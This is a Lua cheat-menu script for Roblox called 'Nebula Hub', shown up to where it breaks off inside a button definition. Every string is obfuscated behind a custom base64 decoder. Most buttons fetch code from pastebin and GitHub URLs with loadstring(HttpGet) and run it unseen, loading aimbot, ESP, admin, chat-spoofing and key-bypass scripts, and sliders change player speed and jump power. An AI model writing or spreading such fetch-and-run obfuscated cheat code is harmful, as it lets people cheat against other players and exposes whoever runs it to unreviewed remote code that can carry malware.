local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')

data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end


 


------------------------ Nebula Hub - Copyright ------------------------

local Rayfield = loadstring(game:HttpGet(PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('RmSGLOyYFQlFQOGDNRvbVvZHLRybMYlHpJCpADHslzAMiQDIkYwhlFzaHR0cHM6Ly9zaXJpdXMubWVudS9yYXlmaWVsZA==')))()

-- Window --
local Window = Rayfield:CreateWindow({
    Name = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('XhwsocQXLowIMvqQVjZAsKnWHfBnRKHOGVyIhZhDwTPnKZacIZvGYDETmVidWxhIEh1Yg=='),
    LoadingTitle = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('XGAXBniqUkEoorYnlgdLfyuzYrIDKhyNDeOhgPxTfjDzZmrxCEIBmMNTG9hZGluZyBOZWJ1bGEgSHViLi4u'),
    LoadingSubtitle = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('cYZDLAZrPbAIKvXiqZscZVTWHHnhFGCAshhPCgyhZyCCpZlooUqVtaaQnkgRGF2aWQ='),
    ConfigurationSaving = {
       Enabled = true,
       FolderName = NebulaHub, -- Create a custom folder for your hub/game
       FileName = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('GxLLdLeJLkyatfWYYhERDitpOfcZOBjJfRQOVDhdPXAnEnGgyVhnNTjQ29uZmln')
    },
    Discord = {
       Enabled = true,
       Invite = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('mJMeopgMyeEkxETtvSXiPIbVALCzAhefYUlDEJzHOJfQMKRBecdszKLZGJ2OXBlSHlnYw=='), -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ABCD would be ABCD
       RememberJoins = true -- Set this to false to make them join the discord every time they load it up
    },
    KeySystem = true, -- Set this to true to use our key system
    KeySettings = {
       Title = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('LJLysViYkSSrKIugLvbZQgvJyfVUSEJaNDLZjzithoJULWDYqKuxYtGTmVidWxhIEh1Yg=='),
       Subtitle = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('npHxdsqSXKOeYFLqbSJjhhAYwSQeBkQBnyYqbDHmdVMsOdBtAHWjGpXS2V5IFN5c3RlbQ=='),
       Note = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('RRUBUbjIyojqWOAGJDMCSrbYSdZFgcLrBkxkJzMTgzGWEWVbJSkCEKKSm9pbiBvdXIgZGlzY29yZCwgYW5kIGdvIHRvIHRoZSBrZXkgY2hhbm5lbCB0byBnZXQgdGhlIGtleS4='),
       FileName = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('cxmZpYkqspjbvcAobMxvHZmgAhVfClrvdOvaBQvWytnvDJVjihHgyoxbmVidWxhaHVibGF0ZXN0a2V5'),
       SaveKey = false,
       GrabKeyFromSite = false,
       Key = {PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('JOEpzPrZDyZhsiMlrPKmtvcRNQClIBwRbvjGclBSTcFeZxCEpmCwUChTmVidWxhSHViT25Ub3A5NDQ=')}
    }
 })
 -- End of window --

 -- Tab --
 local Scripts = Window:CreateTab(PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('LaRCNUvZoTeTxWGaKJChsVwyUeiNYHwbrnDSmICPWTSasxRfaNpdIEiU2NyaXB0cw=='), 4483345998)
 local LocalPlayer = Window:CreateTab(PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('mnjirPdIMYNILNPNqRmPIbTLMupOgugWufhUHcLUyKfCvfMgoTgkVQYTG9jYWxQbGF5ZXI='), 4483345998)
 local Misc = Window:CreateTab(PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('qmpRFskhiHhLUNmqjbJyzxqSlBfcvvUKagdHydJTAEtEiqPiYJOaYuTTWlzYw=='), 4483345998)
 local Credits = Window:CreateTab(PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('zryETMtqwguBCHruMtgOxnwSXwTpxgcXVAGTyfqYbdjNbkDJgXeKicWQ3JlZGl0cw=='), 4483345998)

 -- End of tab --

 -- Section --
 local Section = Scripts:CreateSection(PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('yxrznhBydYTMbnxUakMaJQktiKIZsOtGzuiaVLIFitHMOpnFOxAfENRU2VlIGFsbCBvZiBvdXIgc2NyaXB0cyBiZWxvdw=='))
 local Section = LocalPlayer:CreateSection(PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('jiotpHiWgTCaQQDilxqxsTQYPEhtMsSjOGpcAwbrvDAArHUbzsbRZhwQmVsb3cgeW91IGNhbiBjaGFuZ2UgeW91ciBzcGVlZCBhbmQganVtcHBvd2Vy'))
 local Section = Misc:CreateSection(PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('YZzXxKYzwbxtxogLwKXkSYdmFPachlBbJkROZKbLJXkzUZyesBZUxuQQmVsb3cgeW91IGhhdmUgc29tZSBtaXNjIHNjcmlwdHMgeW91IGNhbiB1c2U='))

 -- End of section --

 -- Extra Functions --

 Rayfield:Notify({
    Title = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('HiddptPglBUASOIqkISPNgxVwurMTOohsmlPkCiqJebIOPQgCiPyLgDTmVidWxhIEh1Yg=='),
    Content = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('hSpisnzQBOrKOURWHbwTGlovSRqispTvYLHkdmgTHLqsdWdcYDHZMmeVGhhbmsgeW91IGZvciB1c2luZyBOZWJ1bGEgSHViLCBpdCBtZWFucyBhbG90IHRvIHVz'),
    Duration = 10,
    Image = 4483362458,
    Actions = { -- Notification Buttons
       Ignore = {
          Name = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('JCrSZgQElCSkcFCuILXTyBjLhvnVNcNeMNPCNvmBblPOfxksqwGeoQJT2theQ=='),
          Callback = function()
          print(PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('vWZraylwMqgzTypzLwNBoxzaKVtwxgMopKJvyQAlkYZgCnrMzRMlSIPWW91IHByZXNzZWQgdGhlIG9rYXkgYnV0dG9u'))
       end
    },
 },
 })
 
 -- End of extra functions --

 -- Credits Page --

 local Paragraph = Credits:CreateParagraph({Title = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('gtpIyuWcllVvleIhKSlDxwWuVEMljxXnbckxPqmRRcZbsQNoXDSMvNtQ29weXJpZ2h0'), Content = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('HjzNEbhttHHOKRDhRXUICjAQWwLSndqxzkBoZAsgNoEUKSzizYNJJZmTUlUIExpY2Vuc2U6IENvcHlyaWdodCAoYykgMjAyNCBEYXZpZCAocGVsbGVwYWx0bmFja2Vwcm85NTcpLiBQZXJtaXNzaW9uIGlzIGhlcmVieSBncmFudGVkLCBmcmVlIG9mIGNoYXJnZSwgdG8gYW55IHBlcnNvbiBvYnRhaW5pbmcgYSBjb3B5IG9mIHRoaXMgc29mdHdhcmUgYW5kIGFzc29jaWF0ZWQgZG9jdW1lbnRhdGlvbiBmaWxlcyAodGhlIFNvZnR3YXJlKSwgdG8gZGVhbCBpbiB0aGUgU29mdHdhcmUgd2l0aG91dCByZXN0cmljdGlvbiwgaW5jbHVkaW5nIHdpdGhvdXQgbGltaXRhdGlvbiB0aGUgcmlnaHRzIHRvIHVzZSwgY29weSwgbW9kaWZ5LCBtZXJnZSwgcHVibGlzaCwgZGlzdHJpYnV0ZSwgc3VibGljZW5zZSwgYW5kL29yIHNlbGwgY29waWVzIG9mIHRoZSBTb2Z0d2FyZSwgYW5kIHRvIHBlcm1pdCBwZXJzb25zIHRvIHdob20gdGhlIFNvZnR3YXJlIGlzIGZ1cm5pc2hlZCB0byBkbyBzby4=')})

 local Paragraph = Credits:CreateParagraph({Title = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('mizoKeMIFnaZBlDJJyBQtSuecuyQHjmRNGuoXOPtWVofAXciZUTFfguQ29weXJpZ2h0IG5vdGljZQ=='), Content = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('lJvoINvqNBLlzMcSioyJPykUzpmDkQZmQlCBzGEFgxhIWHVLBiLITLpVEhFIFNPRlRXQVJFIElTIFBST1ZJREVEIEFTIElTLCBXSVRIT1VUIFdBUlJBTlRZIE9GIEFOWSBLSU5ELCBFWFBSRVNTIE9SIElNUExJRUQsIElOQ0xVRElORyBCVVQgTk9UIExJTUlURUQgVE8gVEhFIFdBUlJBTlRJRVMgT0YgTUVSQ0hBTlRBQklMSVRZLCBGSVRORVNTIEZPUiBBIFBBUlRJQ1VMQVIgUFVSUE9TRSBBTkQgTk9OSU5GUklOR0VNRU5ULiBJTiBOTyBFVkVOVCBTSEFMTCBUSEUgQVVUSE9SUyBPUiBDT1BZUklHSFQgSE9MREVSUyBCRSBMSUFCTEUgRk9SIEFOWSBDTEFJTSwgREFNQUdFUyBPUiBPVEhFUiBMSUFCSUxJVFksIFdIRVRIRVIgSU4gQU4gQUNUSU9OIE9GIENPTlRSQUNULCBUT1JUIE9SIE9USEVSV0lTRSwgQVJJU0lORyBGUk9NLg==')})

 local Label = Credits:CreateLabel(PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('UfsFppImlqanojnOkaLUeMLcqEBkABDMtIoAuGzcNKwYwYvYSDgdRGBVGVhbTogQHVua25vd25nYW1lcjEyMyBhbmQgQHdhcmcuc2U='))

 local Label = Credits:CreateLabel(PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('DaAgpcUvaNswKCIBxGCxKuZWNfmJZXMYccTIFiLnISpJmDDFXDeAmfpSHViIG1hZGUgYnkgRGF2aWQ='))

 local Label = Credits:CreateLabel(PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('ENEszMhPxhfwslIHxXryUbIrhOwUuSuDSFPsDLuSXDplGLBlzBOcpzIVGhpcyBpcyB0aGUgYmVzdCBzY3JpcHRzIGh1Yg=='))

 -- End of credits page --

 -- Sliders --
 local Slider = LocalPlayer:CreateSlider({
   Name = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('nbZCGdtCeslcooiSqWUgXldhpcBgfeekWLuDmldJXrBiOkTmyTVBwEPU3BlZWQ='),
   Range = {1, 500},
   Increment = 10,
   Suffix = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('FbWrrFPUJYqYPCOKzzqyEJagcIJLzJlNRyQkeSWlBZghiwmuISNKzfXU3BlZWQ='),
   CurrentValue = 16,
   Flag = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('TCkCPEAZcfvYOZIpyKTRwEgOWboqwmGxIKRAhFaTDtsyxFFZyINQLyhU3BlZWQ='),
   Callback = function(Value)
      game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
   end,
})

local Slider = LocalPlayer:CreateSlider({
   Name = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('UAsTXLERWYbDuQyViktpdMfQZvdaPPdBYgxqoevcpelrNKlfFSnDCucSnVtcHBvd2Vy'),
   Range = {1, 500},
   Increment = 10,
   Suffix = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('vEcVKNpOOAJoVjsfpHANmVxkvzCEZnqSqvYVklbcgdxlsknPQfMwIZPSnVtcA=='),
   CurrentValue = 50,
   Flag = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('XTOmRWsqEjmERfLFjjhNryfhgfYozEWpXHWxCerGCWusFUZMWQUvTIcSnVtcA=='),
   Callback = function(Value)
      game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value
   end,
})

-- End of sliders --

-- Misc Buttons --
local Button = Misc:CreateButton({
   Name = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('gRiJwstmxHquyNEAjvLktQbGCCpRJtGMgvZvGuFKltJRzhWhmLyTehAQ2hhdCBTcG9vZmVy'),
   Callback = function()
      loadstring(game:HttpGet(PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('FlsCciqgRNQwgfbfnqPDOtQsaSAdOUgMaoiEomxMebbaYYujFyDgCQaaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2RqQmZrOExp')))()
   end,
})

-- End of misc buttons --

 -- Buttons --
 local Button = Credits:CreateButton({
    Name = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('EPKctaieUCLBCCbbzaANhvonaXWQEJhHoblNZcndvnjQLADoDhIDMEKQ2xvc2UgSHVi'),
    Callback = function()
        Rayfield:Destroy()
    end,
 })

 local Button = Scripts:CreateButton({
    Name = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('icHJgoFPRWSoaUtVPnacoAApPnlpvOXMcFaupaeFXRctcUWIRNCCqlWRnJvbnRsaW5lcyBFU1AgJiBIaXRib3ggZXhwYW5kZXI='),
    Callback = function()
        loadstring(game:HttpGet(PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('JdCMTeOnOOzglNVejzKzHRoCQxfjbNMWBgydGsGuCdfPzjuDbdMlxNbaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0hZSGFaNVRR')))()
    end,
 })

 local Button = Scripts:CreateButton({
    Name = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('oDTULBgVLQCcNFPUiPrQMllLkndFElgCjGccouYKLAiBqgSdpWiyXVNQmxhZGUgQmFsbA=='),
    Callback = function()
        loadstring(game:HttpGet(PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('gFigGRnSmgWUfoIFiWZfcTKKdIdmTHMXwIcGWDiFfyylGjFpZDzDwEYaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0ZGSjEvUm9ibG94LUV4cGxvaXRzL21haW4vc2NyaXB0cy9hdXRvcGFycnkubHVh')))()
    end,
 })

 local Button = Scripts:CreateButton({
    Name = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('FpYKBLEQctlNBFXPqdzVOBEHynyduzytNWFcarsxYkruokMkSUCeiSZQmxveCBGcnVpdA=='),
    Callback = function()
        loadstring(game:HttpGet(PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('uhPPlFEAFoZCvWZmzKOzZnkNrvMjJNHbuiLAPAFOQUNKPmUwMFspdAFaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzFzdC1NYXJzL0FubmllL21haW4vMXN0Lmx1YQ==')))()
    end,
 })

 local Button = Scripts:CreateButton({
    Name = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('kKGvPqsgkFKgdCvPvGqjTlrfZWGQFktDxtxwTLThfxHPPBiGwHeVEFYQSBkdXN0eSB0cmlw'),
    Callback = function()
        loadstring(game:HttpGet(PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('hRpyEKjGeclolQJdRQGShGLXCbKUxkthNyVWKKtonLkWjoHQNeSBXdpaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FydGVteTEzMzU2My9VdGlsaXRpZXMvbWFpbi9BRHVzdHlUcmlw'), true))()
    end,
 })

 local Button = Scripts:CreateButton({
    Name = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('KwQCDMpdrgBpcGdJXZafKhNtHLxuQjEMpYsOcrtPnRzqPkbYikVOFapTmFtZWxlc3MgQWRtaW4='),
    Callback = function()
        loadstring(game:HttpGet(PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('wTRMaUYffXaWiADZoLiIIfqHzgetDagTguqFUDtRzjuZcqAgOIifapbaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0ZpbHRlcmluZ0VuYWJsZWQvTmFtZWxlc3NBZG1pbi9tYWluL1NvdXJjZQ==')))()
    end,
 })

 local Button = Scripts:CreateButton({
    Name = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('LfbcpnbGlzbHsRtEoJMsIHiHqNjOASLIVHjGAPvHLItzwWMnRxkQpWbSW5maW5pdHkgWWllbGQ='),
    Callback = function()
        loadstring(game:HttpGet(PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('QWPUGdXjytknAfBDTxlEzPHFAAdSpYTGRKBRRJybThBMJHyjipXogqVaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0VMRERwQXlB')))()
    end,
 })

 local Button = Scripts:CreateButton({
    Name = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('CcfVcmoApEuXDJqFoZmOxfmPZjwzJMnSJmlhsbKBjpqldgBRfYjZlMeVW5pdmVyc2FsIEVTUA=='),
    Callback = function()
        loadstring(game:HttpGet(PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('HEokkmhtpEkVCaQmlTJCJCuLBFEVXQtNrOzZItEtGAgAVJgcVqoRNFLaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NpbnJldC9yYnhzY3JpcHQuY29tLXNjcmlwdHMtcmV1cGxvYWRzLS9tYWluL2VzcGljZQ==')))()
    end,
 })

 local Button = Scripts:CreateButton({
    Name = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('aCSKkEKPlQNGcAaKogAIVnPjpZVmUXJOctLXPoQXHgVbxzUpnnmvSgsVW5pdmVyc2FsIEFpbWJvdA=='),
    Callback = function()
        loadstring(game:HttpGet(PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('gRqWVZPuicTLXMzuGxoKHrYXylikphXOKQpwhQbtJRiChFXyKSMUhOGaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3haMDNHRnF6')))()
    end,
 })

 local Button = Scripts:CreateButton({
    Name = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('FxXOBdVOaQQYOXJOtdujeXyuecUuFvvbIxWcKubYEuzxMqXcvjSBEGPQXJzZW5hbCBLZXlsZXNz'),
    Callback = function()
        loadstring(game:HttpGet(PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('PdbDQJNwobotErtlSpLNfjKJXIspgOlaXERziWEYFEUjvDaVwjvYZrXaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzEyMDFmb3IvVi5HLUh1Yi9tYWluL1YuR2h1Yg==')))()
    end,
 })

 local Button = Scripts:CreateButton({
    Name = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('wnCnVDgnhySrejZdHGhRxyZRjqkhkuZpebPUtKabMmvJxHdVhjheGOTQXJzZW5hbCBLZXk6IG1UQWdMTEZRSmF6d1JXR2g='),
    Callback = function()
        loadstring(game:HttpGet(PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('CycTWkDmWIsqqiZjZwQtUGANtpLSoDYUOcBxEGbOYGfTwsRQTwvWxNPaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0FtZW50ZXNvL3JvYmxveHNjcmlwdHMvbWFpbi9LZXkubHVh'),true))()
    end,
 })

 local Button = Scripts:CreateButton({
    Name = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('kIMyFNqSbLRtIENuudGqBcRsdeyaLpAaCwQhoFqhlckYqIvjdfoCuuEUGV0IFNpbSA5OQ=='),
    Callback = function()
        loadstring(game:HttpGet(PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('tRlKVvAfnCXaTNGLhOCvWfKBWDLayPyHUFUQGDcFzTndXvQTbJWrbmxaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0hHSU9EL0FxdWFGbG93WC9tYWluL0Zsb3dY')))()
    end,
 })

 local Button = Scripts:CreateButton({
    Name = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('FmQgkGcCeQuEYqRaoIoBuwPuNpMFbzdvoZxAXmuQbApfdiZNbfhZmqoS2F0'),
    Callback = function()
        loadstring(game:HttpGet((PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('LzCQXanOhEeUNnjnrFQWjuMWnzxcnNBQkhbiyCdrxCJSQCISwMgWPWcaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3LzZHOUdmcWpD')),true))()
    end,
 })

 local Button = Scripts:CreateButton({
    Name = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('fcnaavuSJRRERwQfEVjPwxlCncWnKVoZGcwAcFApzsayuiSqPqROoUqTmluamEgTGVnZW5kcw=='),
    Callback = function()
        loadstring(game:HttpGet(PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('hUYumXFosdNjIkxbmDAyNMHIdRHbzKxxDUZZGYkmhEnwVmeIETmtyJMaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NjcmlwdHBhc3RlYmluL3Jhdy9tYWluLzE=')))()
    end,
 })

 local Button = Scripts:CreateButton({
    Name = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('VcUiRePILrLGcJmtdVhusoWTWulYNyXJMjWDfulSitpvwnJyPJjQAHIRG9vcnM='),
    Callback = function()
        loadstring(game:HttpGet((PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('BikhVGhwMfDtGoGcvMnlpTMcFxmQHWPwcERJnUFQIbbSdFZovgeqOeJaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0tJTkdIVUIwMS9CbGFja0tpbmcvbWFpbi9CbGFja0tpbmc='))))()
    end,
 })

 local Button = Scripts:CreateButton({
    Name = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('bjMuYACFOVHNaRGoxjSJLDwsdMlGsBsMAIpcfGQpyYYGPRCftvMPftXUHJpc29uIExpZmU='),
    Callback = function()
        loadstring(game:HttpGet((PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('uJjJesDaMmocbJkqnMuKKsXHvxWDsKjfrDPPZMUNXlGDeWCDxixadKCaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0tBN3hGY2JM')),true))()
    end,
 })

 local Button = Scripts:CreateButton({
    Name = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('xgHpYPdvLdwChLiFcnuIVzRrtGvGPumlhPsNuobHSOHidXYlieaMoltU2xhcCBCYXR0bGVz'),
    Callback = function()
        loadstring(game:HttpGet((PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('bJEVlbYeUxnCtiOHFEZKanZiyubUPTleMRypODnTCHjkmvdRTZhhEgdaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2lvbmx5dXNlZ2l0aHViZm9ybWNtb2RzLzEtTGluZS1TY3JpcHRzL21haW4vU2xhcCUyMEJhdHRsZXM='))))()
    end,
 })

 local Button = Scripts:CreateButton({
    Name = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('KMcxyvsimxPNivealwXEuJiLEyXLuCIhcYgxRwIJstUyMNadQqkCUchUmFjZSBDbGlja2Vy'),
    Callback = function()
        loadstring(game:HttpGet(PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('mwAAmfgbdldLuIWBkVYxAdfkJWsRWjYsiqCcKwHILSUOpFoEIVCEvCoaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0hlY0F5aWQ5')))()
    end,
 })

 local Button = Scripts:CreateButton({
    Name = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('BBKzROsMnxWxaKMhdXyFwFoAcDsRWguqGlRnkMDwZsSkvNTTVCqgJGZVHJvbGwgU2NyaXB0'),
    Callback = function()
        loadstring(game:HttpGet(PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('VzPvdHVFRBzsgzWfxJkjMaZifoIOIUGIBdHZVtmCbESJKGpEtIvIevKaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3pxeURTVVdY')))()
    end,
 })

 local Button = Scripts:CreateButton({
   Name = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('ReGqcjMwwvjoblpadTSlVfvUxYTyUdHkvQwrUDpzZtkBMdrjAPANElBQXJzZW5hbCBTY3JpcHQgMw=='),
   Callback = function()
       loadstring(game:HttpGet(PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('icpXkhJgesOrxcMFZGsGCsmXfMrDPTliIIojqQRvqqEDBZvcAeNZVmoaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01pY2stZ29yZG9uL0h5cGVyLUVzY2FwZS9tYWluL0RlbGV0ZU1vYkNoZWF0RW5naW5lLmx1YQ==')))()
   end,
})

local Button = Scripts:CreateButton({
   Name = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('GRXEZFVYSKmQHdiBvopNoYkKMreZkFmpcddxzwdeVBzWpSkVTVEAyuUQnVpbGQgQSBCb2F0IEZvciBUcmVhc3VyZQ=='),
   Callback = function()
       loadstring(game:HttpGet(PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('kjbrGQIpVIXCVuqZTWHYRylgHcNWXSBVIKZwsbsiNjJOAepvniexcyTaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1J1bkRUTS9aZWVyb3hIdWIvbWFpbi9Mb2FkZXIubHVh')))()
   end,
})

local Button = Scripts:CreateButton({
   Name = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('WYzShxnCUQUnGJMnCLzppxtnxEKzdrikwqDvvaNPNehcuUpKqtSFETvQWltYm90'),
   Callback = function()
       loadstring(game:HttpGet(PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('TXwkgyAIgfLgKVmdnSpIuanHVvlIwPYrWAUtomtIIzjPJvpXozeqkWcaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3lncDhFbnll')))()
   end,
})

local Button = Scripts:CreateButton({
   Name = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('ZIyGWdrbyjoXifwAIkFRUAnBeaxrQgFjxSDHixfPyGNvBqiIegLfzYpUmFkYXIgU2NyaXB0'),
   Callback = function()
       loadstring(game:HttpGet(PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('GYyRnkxWXMGLCnVnhOyIcTtVlEhxfoMgnqSaQvtkYnDzwmcGwqmruOVaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3RvcGl0Ym9waXQvc3R1ZmYvbWFpbi9QbGF5ZXJSYWRhci9zb3VyY2UubHVh')))()
   end,
})

local Button = Scripts:CreateButton({
   Name = PBYXUdDCZVppixOLTXTqAeqpeAusHsVjmqxAHTmXNNmBoSd('GcvznqUijGzWZKYsXmrWNJlMSnqoyBQEjvPPrJNXZDPVOAovBkspHfQVGhlIFdpbGQgV2VzdA=='),
   Callback = function()
